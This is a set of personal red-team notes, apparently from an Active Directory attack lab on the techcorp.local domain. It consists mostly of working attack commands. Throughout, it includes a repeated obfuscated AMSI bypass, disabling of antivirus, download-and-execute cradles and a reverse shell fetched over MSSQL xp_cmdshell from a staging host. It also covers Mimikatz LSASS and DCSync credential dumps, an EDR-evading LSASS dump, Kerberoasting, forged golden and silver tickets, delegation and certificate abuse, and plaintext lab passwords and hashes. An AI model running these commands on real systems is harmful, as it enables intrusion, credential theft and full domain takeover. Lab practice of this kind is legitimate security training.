```
rdesktop -d us -u studentuser34 -p ye97uCeEZ5zGYTcK 192.168.100.34 -r disk:AD=/mnt/smb

impacket-smbserver test /mnt/smb/shares -smb2support -username guest -password guest 

net use x: \\192.168.99.134\test  /user:guest guest 
net use x: /delete

sudo  mount -t cifs -o user=studentuser34,password=ye97uCeEZ5zGYTcK //192.168.100.34/shared m/nt/smb
```

- To not forget : Lateral movement
```
GPO
Certificate (certutil -store My)
gMSAs
Find-PSRemotingLocalAdminAccess
PowerupSQL
```

- Cross Domain attack (Domain Trust abuse)
```
- Kerberoast
- Azure AD Integration ("MSOL_*")
- Trust Key
- Child to forest - krbtgt
```

- Cross Forest attack (Forest Trust abuse)
```
- Kerberoast

- Unconstrained Delegation with TGTDelegation
- Trust Key with SID history enabled 
- Foreign Security Principals
- Abusing PAM trust
```

- AV Bypass 
```
S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') +('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ;(Get-varI`A`BLE( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f'.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ("{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

- File upload
```
python3.10 -m uploadserver

curl -X POST http://192.168.100.34:8000/upload -F 'files=@20250227030608_db.zip' 
Invoke-RestMethod -Uri  "http://192.168.100.34:8000/upload" -Method Post -InFile "C:\Users\srvdba\Documents\20250227030608_db.zip" -UseDefaultCredentials

```
- Load AD Module
```
#mimikatz
[https://github.com/g4uss47/Invoke-Mimikatz/tree/master]

cd C:\AD\Tools\
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

$adDllModule='C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll'
$adPsd1Module='C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1'
Import-Module $adDllModule
Import-Module $adPsd1Module

$dsInternalsModule='C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1'
Import-Module $dsInternalsModule

$powerupSQLModule = 'C:\AD\Tools\PowerupSQL-master\PowerupSQL.psd1'
Import-Module $powerupSQLModule


. C:\AD\Tools\.\PowerView.ps1
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
. C:\AD\Tools\Invoke-EDRChecker.ps1

$lapsModule='C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1'
Import-Module $lapsModule -Verbose

```

- Enum with AD Module
```
Get-ADUser -Filter *
Get-ADUser -Filter * | Select -ExpandProperty samaccountname
Get-ADUser -Filter * | Select -ExpandProperty name

Get-ADGroup -Identity 'Domain Admins' -Properties *
Get-ADGroupMember -Identity 'Domain Admins'

Get-ADGroupMember -Identity 'Enterprise Admins'
Get-ADGroupMember -Identity 'Enterprise Admins' -Server techcorp.local
```

- Enum with PowerView
```
. C:\AD\Tools\PowerView.ps1
(Get-DomainPolicy).KerberosPolicy

######ScriptGPOLoot
$domainname=(Get-Domain).Name
$sourcePath = "\\$domainname\SysVol\$domainname\Policies"

Get-ChildItem -Path $sourcePath | ForEach-Object{ Get-ChildItem -Path $_.FullName -Recurse -File -Exclude "*.adml","*.adm","*.admx",".pol","GptTmpl.inf","Registry.xml","Services.xml","Folders.xml","Groups.xml","Files.xml" -ErrorAction SilentlyContinue  | Select-String -Pattern 'user', 'login', 'pass', 'pwd', 'psw', 'database', 'secret', 'password', 'vnc'  -AllMatches -ErrorAction SilentlyContinue | Select-Object -Unique Path }



######ScriptGPO
Get-DomainGPOLocalGroup | ForEach-Object { 
    Write-Output "`n=== GPO: $($_.GPODisplayName) ==="; 
    Write-Output "Managed Local Group: $($_.GroupName)"; 
    Write-Output "Nested in: $(if ($_.GroupMemberOf) { $_.GroupMemberOf | ForEach-Object { ConvertFrom-Sid $_ } } else { 'None' })"; 
    Write-Output "Group Members: $(if ($_.GroupMembers) { $_.GroupMembers | ForEach-Object { ConvertFrom-Sid $_ } } else { 'No explicit members assigned via GPO' })"; 
}

Get-DomainGPOUserLocalGroupMapping -ErrorAction SilentlyContinue | 
    ForEach-Object {
        Write-Output "======================================="
        Write-Output "Computer: $($_.ComputerName)"
        Write-Output "Admin Group: $($_.ObjectName)"
        Write-Output "---------------------------------------"
        
        # Get the members of the group assigned by the GPO
        $members = Get-DomainGroupMember -Identity $_.ObjectName -ErrorAction SilentlyContinue
        
        if ($members) {
            $members | ForEach-Object {
                Write-Output " $($_.MemberName) [$($_.MemberObjectClass)]"
                
                # If the member is a group, list its members
                if ($_.MemberObjectClass -eq "group") {
                    Write-Output "  Expanding group: $($_.MemberName)..."
                    $groupMembers = Get-DomainGroupMember -Identity $_.MemberName -ErrorAction SilentlyContinue
                    if ($groupMembers) {
                        $groupMembers | ForEach-Object { Write-Output "  $($_.MemberName) [$($_.MemberObjectClass)]" }
                    } else {
                        Write-Output "  No members found in $($_.MemberName)"
                    }
                }
            }
        } else {
            Write-Output " No members found in $($_.ObjectName)"
        }
        Write-Output ""
    }

######ScriptRDPGPO
Get-DomainComputer  | Get-DomainGPOComputerLocalGroupMapping -LocalGroup RDP -ErrorAction SilentlyContinue

```

- Domain and Forest Enum
```
Get-DomainTrustMapping
Get-NetForest
Get-ForestTrust
Get-ForestDomain
Get-NetDomainTrust
```

- Privilege escalation
```
. C:\AD\Tools\PowerUp.ps1
Invoke-AllChecks
Invoke-ServiceAbuse -Name ALG
Invoke-ServiceAbuse -Name ALG -UserName us\studentuser34 -Verbose

Find-LocalAdminAccess -Verbose
Find-WMILocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess.ps1

Find-PSRemotingLocalAdminAccess -Domain us.techcorp.local -Verbose

Find-LocalAdminAccess -Verbose
```

- MSSQL Enumeration and exploitation
```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose | select Instance,DomainName,ServiceAccount,Currentlogin,IsSysadmin | ft
Get-SQLServerLink -Instance us-mssql.us.techcorp.local -Verbose

#With HeidiSQL client
select * from master..sysservers
select * from openquery("192.168.23.25",'select * from master..sysservers')
select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version'')')
select * from openquery("192.168.23.25",'select * from openquery("db-sqlprod",''select @@version as version'')')

#or with Get-SQLServerLinkCrawl
Get-SQLServerLinkCrawl -Instance us-mssql -Verbose

#attempting to execute command on each server link node (results in CustomQuery)
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''
#on a particular node
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami''' -QueryTarget db-sqlsrv

#reverse shell
powercat -l -v -p 443 -t 1000

Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.34:8000/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.34:8000/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.34:8000/Invoke-PowerShellTcpEx.ps1)"'''

# Because the link from DB-SQLProd to DB-SQLSrv is configured to use sa.
# enable RPC Out and xp_cmdshell
Invoke-SqlCmd -Query "exec sp_serveroption @server='DB-SQLSRV', @optname='rpc out', @optvalue='TRUE'"
Invoke-SqlCmd -Query "EXECUTE ('sp_configure ''show advanced options'',1;reconfigure;') AT ""DB-SQLSRV"""
Invoke-SqlCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure') AT ""DB-SQLSRV"""

Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''

#in Heidi
select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version;exec master..xp_cmdshell ''''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.34:8000/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.34:8000/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.34:8000/Invoke-PowerShellTcpEx.ps1)"'''''')')
```
- Find all groups of a user 
```
Get-DomainGroup -MemberIdentity studentuser34 | select name
```

- CheatSheet
```
#Add member to group
Get-DomainUser studentuser34 | Add-DomainGroupMember "MACHINEADMINS" -Verbose
winrs -r:us-mgmt cmd

$usmgmt = New-PSSession us-mgmt
Enter-PSSession $usmgmt


$usweb = New-PSSession us-web
Enter-PSSession $usweb
S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') +('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ;(Get-varI`A`BLE( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f'.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ("{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} ) 

$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.99.134:8000/SafetyKatz.exe')
$ReversedData = $data[($data.Length - 1)..0]  

[System.IO.File]::WriteAllBytes("C:\Windows\Temp\hello123456.bin", $ReversedData)
Copy-Item -Path "C:\Windows\Temp\hello123456.bin" -Destination "\\us-web\C$\Windows\Temp\hello123456.bin" -Force



Enter-PSSession $usweb
$ReversedData = [System.IO.File]::ReadAllBytes("C:\Windows\Temp\hello123456.bin")
$data = $ReversedData[($ReversedData.Length - 1)..0]

# Load the assembly into memory
$assem = [System.Reflection.Assembly]::Load($data)
[SafetyKatz.Program]::Main("'sekurlsa::ekeys' 'exit'".Split())


#Kerberoast
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format John | Export-Csv .\kerberoast.csv -NoTypeInformation

[Rubeus.Program]::Main("kerberoast /user:storagesvc /simple /domain:eu.local /outfile:C:\AD\Tools\euhashes.txt".Split())

hashcat hash5  ~/Documents/CRTE/wordlist_pass.txt -m 13100

#Set SPN via UserAccountControl 
Get-ADUser -Identity support33user -Properties ServicePrincipalName | select ServicePrincipalName
Set-DomainObject -Identity supportXuser -Set @{serviceprincipalname='us/1myspn33'} -Verbose
Get-ADUser -Identity support33user -Properties ServicePrincipalName | select ServicePrincipalName

#LAPS
C:\AD\Tools\Get-LapsPermissions.ps1
Get-DomainComputer | where-Object {$_.'ms-mcs-admpwd'} | select dnshostname, ms-mcs-admpwd | ft
winrs -r:us-mailmgmt -u:.\Administrator -p:'m5[7%Sf,xS5&we' cmd

$passwd = ConvertTo-SecureString 'm5[7%Sf,xS5&we' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("us-mailmgmt\Administrator", $passwd)
$mailmgmt = New-PSSession -ComputerName us-mailmgmt -Credential $creds

#Copy file remotely
net use x: \\us-mailmgmt\C$\Users\Public /user:us-mailmgmt\Administrator 'm5[7%Sf,xS5&we'
echo F | xcopy C:\AD\Tools\Invoke-Mimi.ps1 x:\Invoke-Mimi.ps1

#Mimikatz
S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') +('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ;(Get-varI`A`BLE( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f'.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ("{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

netsh interface portproxy add v4tov4 listenport=8000 listenaddress=0.0.0.0 connectport=8000 connectaddress=192.168.99.2
New-NetFirewallRule -DisplayName "Allow Port 8000" -Direction Inbound -Protocol TCP -LocalPort 8000 -Action Allow

IEX (New-Object Net.WebClient).DownloadString('https://192.168.x.x/Invoke-Mimi.ps1')

Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $mailmgmt //(Remotely)
Invoke-Mimi -Command '"sekurlsa::keys"'
Invoke-Mimi -Command "sekurlsa::logonpasswords"
Invoke-Mimi -Command "lsadump::secrets"
Invoke-Mimi -Command '"privilege::debug" "token::elevate" "lsadump::lsa /patch" '
Invoke-Mimi -Command '"privilege::debug" "token::elevate" "lsadump::lsa /inject" '

#gMSAs
$Username = "us\provisioningsvc"
$Password = ConvertTo-SecureString 'T0OverseethegMSAaccounts!!' -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password)

##list
Get-DomainObject -LDAPFilter "(objectClass=msDS-GroupManagedServiceAccount)" -Properties * | select cn
Get-ADServiceAccount -Filter {ObjectClass -eq "msDS-GroupManagedServiceAccount"} | select Name

##get password
$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
$Passwordblob = (Get-ADServiceAccount -Credential $Credential -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'

$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
$hashPass = ConvertTo-NTHash –Password $decodedpwd.SecureCurrentPassword

Invoke-Rubeus "asktgt /user:jumpone /rc4:702b7c5c6e8d37f0a26261e69c5dc71d /createnetonly:C:\Windows\System32\cmd.exe /opsec /force /show /ptt"
[Rubeus.Program]::Main("asktgt /user:jumpone /rc4:702b7c5c6e8d37f0a26261e69c5dc71d /createnetonly:C:\Windows\System32\cmd.exe /opsec /force /show /ptt".Split())

#change user password 
Set-DomainUserPassword -Identity db34svc -AccountPassword (ConvertTo-SecureString 'Password@123' -AsPlainText -Force) -Domain dbvendor.local –Verbose
```

- Add DCSync right to user
```
Get-DomainObjectAcl -SearchBase "dc=us,dc=techcorp,dc=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentuser34"}

Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuser34 -Rights DCSync -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
```
- Run as computer / system mode
[AdvancedRun https://www.nirsoft.net/utils/advanced_run.html](AdvancedRun https://www.nirsoft.net/utils/advanced_run.html)

- Bypass Constrained mode
```
sudo apt install  mono-complete 

Get-ChildItem -Recurse -Force -Path  C:\Windows\Microsoft.NET\ -Include "System.Management.Automation.dll" -ErrorAction SilentlyContinue

mcs Bypass.cs -out:Bypass.exe -platform:x64 -r:System.Management.dll  -r:System.Management.Automation.dll -r:System.Configuration.Install.dll

mkdir C:\windows\temp\hello
curl 'http://192.168.100.34:8000/Bypass.exe' -o C:\windows\temp\hello\Bypass.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\\windows\\Tasks\\Bypass.exe

curl 'http://192.168.100.34:8000/Bypass.exe' -o C:\windows\temp\hello\Bypass.exe
C:\AD\Tools\mockingjay\rcedit-x64.exe C:\windows\temp\hello\Bypass.exe --set-version-string "ProductName" "Vmware Workstation"
copy C:\windows\temp\hello\Bypass.exe \\us-jump2.US.TECHCORP.LOCAL\c$\Windows\Tasks
$usjump = New-PSSession us-jump2
Enter-PsSession $usjump
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\\windows\\Tasks\\Bypass.exe
ls C:\\Windows\\temp\\hello\\hello.txt
gc C:\\Windows\\temp\\hello\\hello.txt
```

- EDR bypass and dump memory
```
Invoke-EDRChecker -Remote -ComputerName us-jumpX
## Enumerating WDAC status and bypass attempt
winrs -r:us-jump2 "powershell Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard"

copy \\us-jump2.US.TECHCORP.LOCAL\c$\Windows\System32\CodeIntegrity\DG.bin.p7 C:\AD\Tools

#reading the WDAC config 
#WDAC => Windows Defender Application Control
#MDE => Microsoft Defender for Endpoint

. C:\AD\Tools\CIPolicyParser.ps1
ConvertTo-CIPolicy -BinaryFilePath C:\AD\Tools\DG.bin.p7 -XmlFilePath C:\AD\Tools\DG.bin.xml
notepad C:\AD\Tools\DG.bin.xml
gc C:\AD\Tools\DG.bin.xml | select-string -pattern ALLOW 

#setting the productname referring to the one found in WDAC config 
cd C:\AD\Tools\mockingjay
C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\msvcp140.dll --set-version-string "ProductName" "Vmware Workstation"
C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\vcruntime140.dll --set-version-string "ProductName" "Vmware Workstation"
C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\vcruntime140_1.dll --set-version-string "ProductName" "Vmware Workstation"
C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\mockingjay.exe --set-version-string "ProductName" "Vmware Workstation"
C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\mscorlib.ni.dll --set-version-string "ProductName" "Vmware Workstation"
Compress-Archive -Path C:\AD\Tools\mockingjay\msvcp140.dll, C:\AD\Tools\mockingjay\vcruntime140.dll, C:\AD\Tools\mockingjay\vcruntime140_1.dll, C:\AD\Tools\mockingjay\mockingjay.exe, C:\AD\Tools\mockingjay\mscorlib.ni.dll -DestinationPath "C:\AD\Tools\mockingjay\mockingjay.zip"

#mscorlib.ni.dll is a DLL on the machine with the free RWX section to perform Self Process Injection in.
#Such as DLL can be found with https://github.com/pwnsauc3/RWXfinder

#converting nanodump into compatible shellcode
C:\AD\Tools\mockingjay\donut.exe -f 1 -p " -sc -f --write nano.dmp" -i C:\AD\Tools\mockingjay\nanodump.x64.exe -o C:\AD\Tools\mockingjay\nano.bin

#Confirm that the mockingjay poc and nano.bin shellcode is undetected
C:\AD\Tools\DefenderCheck.exe C:\AD\Tools\mockingjay\mockingjay.exe
C:\AD\Tools\DefenderCheck.exe C:\AD\Tools\mockingjay\nano.bin

#Download the mockingjay poc and nano.bin
winrs -r:us-jump2 cmd
cd C:\Users\jumpone$\Downloads
"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --incognito http://192.168.100.X/mockingjay.zip
tar -xf C:\Users\jumpone$\Downloads\mockingjay.zip

#Perform an LSASS dump invoking the nano.bin shellcode hosted on the studentvm webserver.
C:\Users\jumpone$\Downloads\mockingjay.exe 192.168.100.X "/nano.bin"

#copy the file, restore the signature and parse it for credentials.
copy \\us-jump2.US.TECHCORP.LOCAL\c$\users\jumpone$\Downloads\nano.dmp C:\AD\Tools\mockingjay
C:\AD\Tools\mockingjay\restore_signature.exe C:\AD\Tools\mockingjay\nano.dmp

https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/refs/heads/master/Invoke-Mimikatz.ps1

iex(new-object system.net.webclient).downloadstring('http://192.168.100.34:8000/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command " `"privilege::debug`" `"sekurlsa::ekeys`" `"exit`"  "


[SafetyKatz.Program]::Main("'sekurlsa::minidump C:\AD\Tools\mockingjay\nano.dmp' 'sekurlsa::keys' 'exit'".Split())
```
- Load Rubeus
[https://github.com/r3motecontrol/Ghostpack-CompiledBinaries]
```

$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.99.134:8000/Rubeus.exe')

$assem = [System.Reflection.Assembly]::Load($data)

[Rubeus.Program]::Main(" ".Split())


iex(new-object system.net.webclient).downloadstring('http://192.168.100.34:8000/Invoke-Rubeus.ps1')
Invoke-Rubeus "golden /user:Administrator /id:500 /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /groups:513 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /rc4:b0975ae49f441adc6b024ad238935af5 /ptt"
```

- Load Mimikatz
```
S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') +('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ;(Get-varI`A`BLE( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f'.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ("{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
iex(new-object system.net.webclient).downloadstring('http://192.168.100.34:8000/Invoke-Mimi.ps1')
Invoke-Mimi -Command " `"lsadump::lsa /patch`" `"sekurlsa::ekeys`" `"exit`"  "
Invoke-Mimi -Command " `"privilege::debug`" `"sekurlsa::ekeys`" `"exit`"  "
Invoke-Mimi -Command '"lsadump::dcsync /user:us\krbtgt" "exit"'
Invoke-Mimi -Command '"lsadump::dcsync /user:us\Administrator" "exit"'
Invoke-Mimi -Command '"privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "exit"'
 

```
- User impersonation
```
//no privilege required
runas /user:us\provisioningsvc /savecred powershell.exe

//with admin privilege
$Username = "us\provisioningsvc"
$Password = ConvertTo-SecureString 'T0OverseethegMSAaccounts!!' -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password)
Start-Process "powershell.exe" -Credential $Credential -Wait

//with Hash

[Rubeus.Program]::Main("asktgt /user:jumpone /rc4:702b7c5c6e8d37f0a26261e69c5dc71d /opsec /force /createnetonly:C:\Windows\System32\cmd.exe /show /ptt".Split())
[Rubeus.Program]::Main("asktgt /user:jumpone /aes256:702b7c5c6e8d37f0a26261e69c5dc71d /opsec /force /createnetonly:C:\Windows\System32\cmd.exe /show /ptt".Split())

```

- Unconstrained Delegation 
```
Get-DomainComputer -Unconstrained | select-object -property cn
Get-ADComputer -Filter {TrustedForDelegation -eq $True} | select Name 

[Rubeus.Program]::Main("asktgt /user:webmaster /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /opsec /force /createnetonly:C:\Windows\System32\cmd.exe /show /ptt".Split())

winrs -r:us-web cmd.exe
[Rubeus.Program]::Main("monitor /interval:5 /nowrap".Split())
[Rubeus.Program]::Main("monitor /targetuser:US-DC$ /interval:5 /nowrap".Split())
[Rubeus.Program]::Main("monitor /targetuser:TECHCORP-DC$ /interval:5 /nowrap".Split())

#force connectin from DC to us-web
C:\AD\Tools\MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
C:\AD\Tools\MS-RPRN.exe \\techcorp-dc.techcorp.local \\us-web.us.techcorp.local

[Rubeus.Program]::Main("ptt /ticket:....".Split())

IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.34:8000/Invoke-Mimi.ps1')
Invoke-Mimi -Command '"lsadump::dcsync /user:us\krbtgt /domain:us.techcorp.local" "exit"'
Invoke-Mimi -Command '"lsadump::dcsync /user:techcorp\krbtgt /domain:techcorp.local" "exit"'
```

- Constrained Delegation 
```
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

Get-DomainUser -TrustedToAuth | select-object -property cn, msds-allowedtodelegateto | fl 
Get-DomainComputer -TrustedToAuth | select-object -property cn, msds-allowedtodelegateto | fl

Invoke-Rubeus "s4u /user:appsvc /aes256:b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335 /impersonateuser:Administrator /msdsspn:CIFS/us-mssql.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /ptt"

winrs -r:us-mssql.us.techcorp.local cmd.exe

Invoke-Rubeus "hash /password:Qwerty@123 /user:storagesvc /domain:eu.local"
Invoke-Rubeus "s4u /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC /impersonateuser:Administrator /msdsspn:time/EU-DC.eu.local /altservice:ldap /domain:eu.local /dc:eu-dc.eu.local /ptt"

Invoke-Mimi -Command '"lsadump::dcsync /user:eu\krbtgt /domain:eu.local" "exit"'
Invoke-Mimi -Command '"lsadump::dcsync /user:eu\Administrator /domain:eu.local" "exit"'
```

- RBCD
Example of abusable service: (HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM, LDAP for dcsync, CIFS for share)
```
winrs -r:us-mgmt cmd
[SafetyKatz.Program]::Main("'sekurlsa::ekeys' 'exit'".Split())
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'mgmtadmin'}

[Rubeus.Program]::Main("asktgt /user:mgmtadmin /aes256:32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt".Split())
Invoke-Rubeus "asktgt /user:mgmtadmin /aes256:32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt"

$comps = ('student34$')

Set-ADComputer -Identity us-helpdesk -PrincipalsAllowedToDelegateToAccount $comps -Verbose

#Get AES keys for student34
[SafetyKatz.Program]::Main("'sekurlsa::ekeys' 'exit'".Split())

#Use the AES key for studentx$ with Rubeus and request a TGS for HTTP SPN
[Rubeus.Program]::Main("s4u /user:student34$ /rc4:01da454069d7927eb1a7eb89d5e97d63 /msdsspn:http/us-helpdesk /impersonateuser:Administrator /ptt".Split())
klist
winrs -r:us-helpdesk cmd
[SafetyKatz.Program]::Main("'sekurlsa::ekeys' 'exit'".Split())
[Rubeus.Program]::Main("asktgt /user:helpdeskadmin /aes256:f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt".Split())
```

- ADCS 
```
C:\AD\Tools\Certify.exe find /vulnerable
C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
C:\AD\Tools\Certify.exe find /clientauth

C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
#export in pfx
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\DA.pfx
[Rubeus.Program]::Main("asktgt /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:SecretPass@123 /nowrap /ptt".Split())

```

- Compromise Azure AD Connect machine
```
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server techcorp.local -Properties * | select SamAccountName,Description | fl
Get-DomainUser  -Domain techcorp.local  | Where-Object{$_.samAccountName -like 'MSOL_*'} |select  SamAccountName,Description | fl

#connect to a computer where AD connect is running
winrs -r:us-adconnect cmd
#disable anti virus
Set-MpPreference -DisableRealtimeMonitoring $true
iex (New-Object Net.WebClient).DownloadString('http://192.168.100.34:8000/adconnect.ps1')
ADconnect
```

- Escalate privilege from child domain to parent domain using trust key 
```
[Rubeus.Program]::Main("asktgt /user:Administrator /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b335 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt".Split())

winrs -r:us-dc powershell
Invoke-Mimi -Command ' "lsadump::trust /patch" '
#copy rc4_hmac_nt for [ In ] US.TECHCORP.LOCAL -> TECHCORP.LOCAL

[Rubeus.Program]::Main("silver /user:Administrator /ldap /service:krbtgt/US.TECHCORP.LOCAL /rc4:544f2593ee14b0e209c1e3a47e04b6fa /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /nowrap".Split())
#the rc4 is the one copied
#S-1-5-21-2781415573-3701854478-2406986946-519 is SID of TECHCORP\Enterprise Admins

[Rubeus.Program]::Main("asktgs /service:CIFS/techcorp-dc.TECHCORP.LOCAL /dc:techcorp-dc.TECHCORP.LOCAL /ptt /ticket:doIFyzCCBcegAw...".Split())
dir \\techcorp-dc.TECHCORP.LOCAL\c$
```
